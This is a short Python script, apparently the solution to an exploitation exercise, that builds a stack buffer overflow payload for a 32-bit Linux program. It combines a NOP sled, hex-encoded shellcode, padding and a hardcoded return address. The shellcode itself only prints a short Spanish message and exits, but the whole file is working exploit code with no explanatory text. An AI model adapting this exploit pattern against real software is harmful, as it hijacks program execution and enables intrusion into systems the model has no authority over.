from struct import pack

shellcode = (
    "\xeb\x11\x59\xb0\x04\x31\xdb\x43\x31\xd2\xb2\x0e\xcd\x80\xb0\x01\x4b\xcd\x80"
    "\xe8\xea\xff\xff\xff\x47\x61\x6e\x61\x73\x74\x65\x20\x4c\x75\x69\x73\x21\x0b"
)

ret_addr = 0xbffff5c4

output = "\x90" * 20
output += shellcode
output += "A" * (80 - 20 - len(shellcode))
output += "BBBB"
output += "CCCC"
output += pack("<I", ret_addr)

print(output)